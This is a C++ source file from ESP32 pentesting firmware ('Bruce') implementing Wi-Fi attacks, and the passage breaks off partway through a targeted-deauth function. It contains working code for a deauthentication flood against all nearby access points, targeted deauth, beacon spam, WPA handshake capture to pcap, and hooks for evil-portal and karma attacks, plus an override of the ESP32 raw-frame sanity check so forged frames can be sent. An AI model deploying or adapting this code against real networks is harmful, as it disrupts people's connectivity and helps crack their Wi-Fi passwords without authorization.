// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "karma_attack.h"
#include "sniffer.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>
#include <nvs_flash.h>
#include <vector>
#include <algorithm> 

#define WIFI_ATK_NAME "BruceAttack"
extern bool showHiddenNetworks;

// Broadcast MAC for flood attacks
const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

std::vector<wifi_ap_record_t> ap_records;

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;

// Beacon packet template
// clang-format off
constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02,  0x03, 0x04, 0x05, 0x06, // Source (placeholder - overwritten)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (placeholder - overwritten)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (SDK will set)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capability info (will set WPA flag later)
    /* 36 - 37 */ 0x00, 0x20,         // Tag: SSID parameter set, tag length 32 (we will write SSID into bytes 38..69)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    /* 70 - 71 */ 0x01, 0x08, // Supported rates tag length 8
    /* 72 */ 0x82,
    /* 73 */ 0x84,
    /* 74 */ 0x8b,
    /* 75 */ 0x96,
    /* 76 */ 0x24,
    /* 77 */ 0x30,
    /* 78 */ 0x48,
    /* 79 */ 0x6c,
    /* 80 - 81 */ 0x03, 0x01,          // Current Channel tag
    /* 82 */ 0x01, // Current channel (overwritten)
    /* 83 - 84 */ 0x30, 0x18, // RSN information (start)
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};
// clang-format on

static inline void prepareBeaconPacket(
    uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
    uint8_t channel, bool setWPAflag = true
) {
    // copy template into a packet
    memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);

    // write MAC addresses (source and BSSID)
    memcpy(&outPacket[10], macAddr, 6); // Source
    memcpy(&outPacket[16], macAddr, 6); // BSSID

    // ensure SSID slot is cleared (32 bytes) then copy SSID
    memset(&outPacket[38], 0x20, 32); // keep template behavior
    if (ssidLen > 32) ssidLen = 32;
    outPacket[37] = ssidLen; // SSID element length
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }

    // set channel and WPA flags
    outPacket[82] = channel;
    outPacket[34] = 0x31;
}

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    if (nChannels == 0) return;
    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    if (ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void wifi_complete_cleanup() {
    Serial.println("[WIFI_ATK] Complete WiFi cleanup");
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    // DO NOT call esp_wifi_deinit() here - let wifi_common.h handle it
    // esp_wifi_deinit(); // REMOVED
    // esp_wifi_restore(); // REMOVED
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(300);
}

void checkHeap(const char *tag) {
    uint32_t currentHeap = ESP.getFreeHeap();
    Serial.printf("[HEAP] %s - Free: %ld\n", tag, currentHeap);
}

void resetGlobalState() {
    options.clear();
    options.shrink_to_fit();
    SelPress = false;
    EscPress = false;
    PrevPress = false;
    NextPress = false;
    returnToMenu = false;
    tft.fillScreen(bruceConfig.bgColor);
}

// โครงสร้างเก็บข้อมูล Client (ต้องประกาศนอกฟังก์ชันเพื่อให้ callback ใช้ได้)
struct ClientInfo {
    uint8_t mac[6];
    unsigned long last_seen;
    bool active;
    uint8_t scrollOffset;   // <-- เพิ่มบรรทัดนี้
};

// ตัวแปร global สำหรับ callback (static เพื่อใช้ภายในไฟล์นี้เท่านั้น)
static uint8_t g_targetBssid[6];
static std::vector<ClientInfo> g_clients;
#define CLIENT_TIMEOUT 10000  // 10 วินาที

void promisc_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *payload = pkt->payload;

    // Frame Control field: 2 bytes ที่ offset 0
    uint8_t frameType = (payload[0] >> 2) & 0x03;  // Type bits 2-3

    // สนใจเฉพาะ Data frames (type = 2)
    if (frameType == 2) {
        // Address fields ใน 802.11 header:
        // Addr1 = destination (offset 4)
        // Addr2 = source      (offset 10)
        uint8_t *addr1 = payload + 4;
        uint8_t *addr2 = payload + 10;

        // เช็คว่าเกี่ยวข้องกับ AP เป้าหมายหรือไม่
        bool from_ap = (memcmp(addr2, g_targetBssid, 6) == 0);
        bool to_ap   = (memcmp(addr1, g_targetBssid, 6) == 0);

        if (from_ap || to_ap) {
            // เลือก MAC ของ client (ฝั่งที่ไม่ใช่ AP)
            uint8_t *client_mac = from_ap ? addr1 : addr2;

            // หาใน list
            bool found = false;
            for (auto &c : g_clients) {
                if (memcmp(c.mac, client_mac, 6) == 0) {
                    c.last_seen = millis();
                    c.active = true;
                    found = true;
                    break;
                }
            }
            if (!found && g_clients.size() < 20) {
                ClientInfo nc;
                memcpy(nc.mac, client_mac, 6);
                nc.last_seen = millis();
                nc.active = true;
                g_clients.push_back(nc);
            }
        }
    }
}


/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_PERIOD_MS);
}

/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
    Serial.print("\nPreparing deauth frame to AP -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }
    if (memcmp(target, _default_target, 6) != 0) {
        Serial.print(" and Tgt: ");
        for (int j = 0; j < 6; j++) {
            Serial.print(target[j], HEX);
            if (j < 5) Serial.print(":");
        }
    }

    esp_err_t err;
    err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) Serial.println("Error changing channel");
    vTaskDelay(50 / portTICK_PERIOD_MS);
    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}

/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen
***************************************************************************************/
void wifi_atk_info(String tssid, String mac, uint8_t channel) {
    // desenhar a tela
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
    tft.drawString("AP: " + tssid, 10, 48);
    tft.drawString("Channel: " + String(channel), 10, 66);
    tft.drawString(mac, 10, 84);
    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
    vTaskDelay(200 / portTICK_PERIOD_MS);
    SelPress = false;

    while (1) {
        if (check(SelPress)) {
            returnToMenu = false;
            return;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}
/***************************************************************************************
** function: wifi_atk_setWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_setWifi() {
    checkHeap("Wifi atk start");

    if (WiFi.getMode() != WIFI_MODE_NULL) { return true; }

    wifi_complete_cleanup();
    delay(100);

    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            displayError("Failed starting WIFI", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
        uint8_t randomChannel = random(1, 12);
        if (!WiFi.softAP(WIFI_ATK_NAME, emptyString, randomChannel, 1, 4, false)) {
            displayError("Failed starting  AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return true;
}

/***************************************************************************************
** function: wifi_atk_unsetWifi
** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
***************************************************************************************/
bool wifi_atk_unsetWifi() {
    if (WiFi.softAPSSID() == WIFI_ATK_NAME) {
        if (!WiFi.softAPdisconnect()) {
            displayError("Failed Stopping AP Attacker", true);
            return false;
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED && WiFi.softAPSSID() != bruceConfig.wifiAp.ssid) wifiDisconnect();

    return true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void wifi_atk_menu() {
    resetGlobalState();

    if (WiFi.getMode() == WIFI_MODE_NULL) {
        wifi_complete_cleanup();
        delay(500);
    }

    checkHeap("Wifi menu start");

    bool scanAtks = false;
    options = {
        {"Target Atks",  [&]() { scanAtks = true; }    },
#ifndef LITE_VERSION
        {"Karma Attack", [=]() { karma_setup(); }      },
#endif
        {"Beacon SPAM",  [=]() { beaconAttack(); }     },
        {"Deauth Flood", [=]() { deauthFloodAttack(); }},
    };
    addOptionToMainMenu();
    loopOptions(options);
    if (!returnToMenu) {
        if (!wifi_atk_setWifi()) return;
    }
    if (scanAtks) {
        int nets;
        displayTextLine("Scanning..");
        // include hidden networks in the scan depending on toggle
        nets = WiFi.scanNetworks(false, showHiddenNetworks);
        ap_records.clear();
        options = {};
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memset(&record, 0, sizeof(record));
            // copy bssid
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            // copy channel/primary
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            // copy authmode
            record.authmode = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
            // copy ssid bytes into record.ssid (if supported by struct)
            // Ensure safe copy (wifi_ap_record_t typically has ssid[32])
            if (strlen(WiFi.SSID(i).c_str()) > 0) {
                strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
                record.ssid[sizeof(record.ssid) - 1] = '\0';
            } else {
                // empty -> leave zeroed or explicit empty string
                record.ssid[0] = '\0';
            }

            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            int32_t ch = WiFi.channel(i);
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }

            // if SSID is empty -> indicate hidden
            String displaySSID = ssid;
            if (displaySSID.length() == 0) {
                // show the BSSID so user can recognize it
                displaySSID = "<Hidden SSID> " + WiFi.BSSIDstr(i);
            }

            String optionText = encryptionPrefix + displaySSID + " (" + String(rssi) + "|" +
                                encryptionTypeStr + "|ch." + String(ch) + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   ap_record = ap_records[i];
                                   target_atk_menu(
                                       WiFi.SSID(i).c_str(),
                                       WiFi.BSSIDstr(i),
                                       static_cast<uint8_t>(WiFi.channel(i))
                                   );
                               }});
        }

        addOptionToMainMenu();

        loopOptions(options);
        options.clear();
        ap_records.clear();
        ap_records.shrink_to_fit();
    }
    wifi_atk_unsetWifi();
    checkHeap("Wifi menu end");
}

void deauthFloodAttack() {
    // Stop WebUI before setting WiFi mode for attack
    cleanlyStopWebUiForWiFiFeature();
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int nets;
ScanNets:
    displayTextLine("Scanning..");
    // include hidden networks in the scan depending on toggle
    nets = WiFi.scanNetworks(false, showHiddenNetworks);
    ap_records.clear();
    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memset(&record, 0, sizeof(record));
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = static_cast<uint8_t>(WiFi.channel(i));
        // copy ssid bytes too
        if (strlen(WiFi.SSID(i).c_str()) > 0) {
            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
            record.ssid[sizeof(record.ssid) - 1] = '\0';
        } else {
            record.ssid[0] = '\0';
        }
        ap_records.push_back(record);
    }
    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescan_counter = millis();
    uint16_t count = 0;
    uint8_t channel = 0;
    drawMainBorderWithTitle("Deauth Flood");
    while (true) {
        for (const auto &record : ap_records) {
            channel = record.primary;
            wsl_bypasser_send_raw_frame(
                &record, record.primary, _default_target
            ); // Sets channel to the same AP
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(record.primary) + "    ");
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        // Update counter every 2 seconds
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Deauth Flood");
            tft.setCursor(10, tftHeight - 25);
            tft.print("Frames:               ");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(channel) + "    ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescan_counter > 60000) goto ScanNets;

        if (check(EscPress)) break;
    }
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

/***************************************************************************************
** function: capture_handshake
** @brief: Capture handshake for a selected network
**          (redraws only when deauth is sent or when a handshake/EAPOL is captured)
***************************************************************************************/
uint8_t targetBssid[6]; // Just the target AP MAC to pass onto sniff.cpp to filter out EAPOL frames of
                        // unrelated APs
#if !defined(LITE_VERSION)
void capture_handshake(String tssid, String mac, uint8_t channel) {

    // Stop WebUI before setting WiFi mode for handshake capture
    cleanlyStopWebUiForWiFiFeature();

    hsTracker = HandshakeTracker(); // Reset tracker for each new capture

    uint8_t bssid_array[6];
    sscanf(
        mac.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &bssid_array[0],
        &bssid_array[1],
        &bssid_array[2],
        &bssid_array[3],
        &bssid_array[4],
        &bssid_array[5]
    );

    // Set the target record for deauth
    memcpy(ap_record.bssid, bssid_array, 6);
    memcpy(targetBssid, bssid_array, 6);
    ap_record.primary = channel;

    String encryptionTypeStr = "Unknown";
    for (int i = 0; i < ap_records.size(); i++) {
        if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
            switch (ap_records[i].authmode) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }
            break;
        }
    }

    // Sanitize SSID for use in filename
    String sanitizedSsid = "";
    for (size_t i = 0; i < tssid.length() && i < 32; i++) {
    char c = tssid[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
            c == '_' || c == '.') {
            sanitizedSsid += c;
        } else {
            sanitizedSsid += '_';
        }
    }
    // If SSID was hidden/empty, use BSSID appended to filename so it's unique and descriptive
    if (sanitizedSsid.length() == 0) {
        char bssidHex[32];
        sprintf(
            bssidHex,
            "%02X%02X%02X%02X%02X%02X",
            bssid_array[0],
            bssid_array[1],
            bssid_array[2],
            bssid_array[3],
            bssid_array[4],
            bssid_array[5]
        );
        sanitizedSsid = String("HIDDEN_") + String(bssidHex);
    }

    char hsFileName[128];
    sprintf(
        hsFileName,
        "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
        bssid_array[0],
        bssid_array[1],
        bssid_array[2],
        bssid_array[3],
        bssid_array[4],
        bssid_array[5],
        sanitizedSsid.c_str()
    );

    bool hsExists = false;
    FS *fs;
    if (setupSdCard()) {
        fs = &SD;
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP/handshakes")) {
            SD.mkdir("/BrucePCAP");
            SD.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = SD.exists(hsFileName);
    } else {
        fs = &LittleFS;
        isLittleFS = true;
        if (!LittleFS.exists("/BrucePCAP/handshakes")) {
            LittleFS.mkdir("/BrucePCAP");
            LittleFS.mkdir("/BrucePCAP/handshakes");
        }
        hsExists = LittleFS.exists(hsFileName);
    }

    // Register the file path so the sniffer knows to save the capture to it
    String hsFilePath = String(hsFileName);
    if (!hsExists) {
        File hsFile = fs->open(hsFileName, FILE_WRITE);
        if (hsFile) {
            writeHeader(hsFile);
            hsFile.close();
            // Register using the file path
            SavedHS.insert(hsFilePath);
            // Mark as ready to capture
            uint64_t apKey = 0;
            for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
            markHandshakeReady(apKey);
            Serial.println("Created new handshake file for target AP");
            Serial.print("Target BSSID: ");
            for (int i = 0; i < 6; i++) {
                Serial.printf("%02X", bssid_array[i]);
                if (i < 5) Serial.print(":");
            }
            Serial.println();
            Serial.println("Added to SavedHS set for beacon capture");
        } else {
            Serial.println("Failed to create handshake file");
        }
    } else {
        // File already exists: Add to SavedHS and mark as captured
        SavedHS.insert(hsFilePath);
        uint64_t apKey = 0;
        for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | bssid_array[i]; }
        markHandshakeReady(apKey);
        Serial.println("Handshake file already exists");
    }

    checkHeap("Handshake start");

    wifi_complete_cleanup();
    delay(100);

    if (!WiFi.mode(WIFI_MODE_STA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    // Initialize sniffer backend
    if (!sniffer_prepare_storage(fs, !isLittleFS)) {
        displayError("Sniffer queue error", true);
        return;
    }

    ch = channel;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(channel, secondCh);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    int deauthCount = 0;
    int initialNumEAPOL = num_EAPOL;
    int prevNumEAPOL = initialNumEAPOL;
    bool hasBeacons = false;

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);

    // only redraw when we explicitly need to (deauth sent or handshake captured)
    bool needRedraw = true; // draw once on entry

    while (true) {
        // Check if we have beacons
        BeaconList targetBeacon;
        memcpy(targetBeacon.MAC, bssid_array, 6);
        targetBeacon.channel = channel;
        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }

        // Redraw whenever new EAPOL Frame arrives
        if (num_EAPOL > prevNumEAPOL) {
            prevNumEAPOL = num_EAPOL;
            needRedraw = true;
        }

        // Mark handshake captured only when we have useable EAPOL Frame pairs
        if (handshakeUsable(hsTracker)) {
            // Handshake is usable
        }

        if (needRedraw) {
            drawMainBorderWithTitle("Handshake Capture");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("SSID: " + tssid);
            padprintln("BSSID: " + mac);
            padprintln("Security: " + encryptionTypeStr);
            padprintln("");

            // Show console status
            if (hasBeacons && handshakeUsable(hsTracker)) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                padprintln("Status: CAPTURED!");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else if (hasBeacons) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Beacon captured");
                padprintln("");
                tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 2: " + String(hsTracker.msg2 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg3 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 3: " + String(hsTracker.msg3 ? "Captured" : "None"));
                tft.setTextColor(hsTracker.msg4 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                padprintln("        EAPOL MSG 4: " + String(hsTracker.msg4 ? "Captured" : "None"));
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("Status: Waiting...");
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }

            padprintln("");
            padprintln("Deauth sent: " + String(deauthCount));
            padprintln("");
            tft.drawRightString(
                "Press " + String(BTN_ALIAS) + " to send deauth", tftWidth - 10, tftHeight - 35, 1
            );
            tft.drawString("Press Back to exit", 10, tftHeight - 20);

            // reset redraw flag
            needRedraw = false;
        }

        // If user presses the select button -> send deauth and request redraw
        if (check(SelPress)) {
            wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            deauthCount += 5;
            needRedraw = true; // show updated deauth counter
        }

        // Exit condition
        if (check(EscPress)) { break; }

        // small yield so other tasks can run; keeps responsiveness without constant redraw
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    // DO NOT call wifi_complete_cleanup() here - it has esp_wifi_deinit()
    // Just stop WiFi operations
    esp_wifi_stop();
    delay(100);
    returnToMenu = true;
}
#endif
/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
#ifndef LITE_VERSION
        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
#endif
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify",
         [=]() // New WiFi Attack
         { EvilPortal(tssid, channel, true, true); }                               },
    };
    addOptionToMainMenu();

    loopOptions(options);
    if (!returnToMenu) goto AGAIN;
}

/***************************************************************************************
** function: target_atk
** @brief: Deploy Target deauth
***************************************************************************************/
// ********** ฟังก์ชันเสริม: หา OUI จาก MAC (3 octets แรก) **********
String getOUI(uint8_t *mac) {
    // รายชื่อ OUI ยอดนิยม (เพิ่มเติมได้ตามต้องการ)
    if (mac[0]==0x00 && mac[1]==0x1A && mac[2]==0x11) return "Apple";
    if (mac[0]==0x00 && mac[1]==0x1B && mac[2]==0x63) return "Apple";
    if (mac[0]==0x00 && mac[1]==0x1E && mac[2]==0xC2) return "Apple";
    if (mac[0]==0x00 && mac[1]==0x1F && mac[2]==0xF3) return "Apple";
    if (mac[0]==0x00 && mac[1]==0x23 && mac[2]==0x6C) return "Apple";
    if (mac[0]==0x00 && mac[1]==0x25 && mac[2]==0x00) return "Apple";
    // Samsung
    if (mac[0]==0x00 && mac[1]==0x16 && mac[2]==0xDB) return "Samsung";
    if (mac[0]==0x00 && mac[1]==0x1E && mac[2]==0x3A) return "Samsung";
    if (mac[0]==0x00 && mac[1]==0x1C && mac[2]==0xDF) return "Samsung";
    // Huawei
    if (mac[0]==0x00 && mac[1]==0x18 && mac[2]==0x82) return "Huawei";
    if (mac[0]==0x00 && mac[1]==0x0C && mac[2]==0xE7) return "Huawei";
    // Xiaomi
    if (mac[0]==0x00 && mac[1]==0x9E && mac[2]==0xC8) return "Xiaomi";
    if (mac[0]==0x00 && mac[1]==0x0D && mac[2]==0x3A) return "Xiaomi";
    // Sony
    if (mac[0]==0x00 && mac[1]==0x01 && mac[2]==0x4A) return "Sony";
    if (mac[0]==0x00 && mac[1]==0x04 && mac[2]==0x1F) return "Sony";
    // Google
    if (mac[0]==0x00 && mac[1]==0x1A && mac[2]==0x11) return "Google";
    // Microsoft
    if (mac[0]==0x00 && mac[1]==0x50 && mac[2]==0xF2) return "Microsoft";
    // Intel
    if (mac[0]==0x00 && mac[1]==0x1C && mac[2]==0xBF) return "Intel";
    // เพิ่มเติมได้เรื่อย ๆ
    return ""; // unknown
}

//-----------[Main]-----------------

void target_atk(String tssid, String mac, uint8_t channel) {
    resetGlobalState();
    cleanlyStopWebUiForWiFiFeature();
    if (!wifi_atk_setWifi()) return;

    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &g_targetBssid[0], &g_targetBssid[1], &g_targetBssid[2],
           &g_targetBssid[3], &g_targetBssid[4], &g_targetBssid[5]);

    wifi_ap_record_t target_ap;
    memset(&target_ap, 0, sizeof(target_ap));
    memcpy(target_ap.bssid, g_targetBssid, 6);
    target_ap.primary = channel;

    // Client monitoring (เริ่มดักจับ client ก่อนเพื่อใช้ในเมนู)
    g_clients.clear();
